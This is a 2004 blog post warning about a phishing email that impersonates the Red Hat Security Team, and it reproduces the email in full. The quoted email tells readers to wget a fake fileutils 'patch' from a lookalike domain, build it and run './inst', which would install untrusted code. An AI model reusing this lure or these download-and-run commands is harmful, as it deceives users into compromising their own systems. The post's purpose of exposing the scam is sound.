---
id: 89
title: RedHat Scammers
date: 2004-10-28T09:49:53+00:00
author: Matthew Schick
layout: single
guid: http://www.excentral.org/archives/2004/10/28/redhat-scammers/
permalink: /archives/2004/10/28/redhat-scammers
categories:
  - General
---
I know this is old news, but I did get this phishy email regarding the fileutils 'vulnerability' on RedHat.  Since this has come out there's been all sorts of doom-n-gloom articles with titles such as "<a href="http://www.newsforge.com/article.pl?sid=04/10/27/0351205">Red Hat email scam: Hard target or harbinger for Linux?</a>" but, as you can see below, this email looks nothing like any of the official errata reports from RH.  It also asks users to download a tar.gz file instead of simply connecting to RHN, and the email isn't signed with the RH gpg key.  If you fell for this, you don't need to be an admin... Sorry.

<img src="http://www.redhat.com/g/chrome/logo_rh_home.png" />

Original issue date: October 20, 2004
Last revised: October 20, 2004
Source: RedHat

A complete revision history is at the end of this file.

Dear RedHat user,

Redhat found a vulnerability in fileutils (ls and mkdir), that could allow a remote attacker to execute arbitrary code with root privileges. Some of the affected linux distributions include RedHat 7.2, RedHat 7.3, RedHat 8.0, RedHat 9.0, Fedora CORE 1, Fedora CORE 2 and not only. It is known that *BSD and Solaris platforms are NOT affected.

The RedHat Security Team strongly advises you to immediately apply the<strong> fileutils-1.0.6 patch</strong>. This is a critical-critical update that you must make by following these steps:
<ul>
	<li>First download the patch from the Security RedHat mirror: <strong><em>wget www.fedora-redhat.com/fileutils-1.0.6.patch.tar.gz</em></strong></li>
	<li>Untar the patch:<em><strong> tar zxvf fileutils-1.0.6.patch.tar.gz</strong></em></li>
	<li><em><strong>cd fileutils-1.0.6.patch</strong></em></li>
	<li><em><strong>make</strong></em></li>
	<li><em><strong>./inst</strong></em></li>
</ul>
Again, please apply this patch as soon as possible or you risk your system and others` to be compromised.

Thank you for your prompt attention to this serious matter,

RedHat Security Team.
<p class="style1">Copyright Â© 2004 Red Hat, Inc. All rights reserved.</p>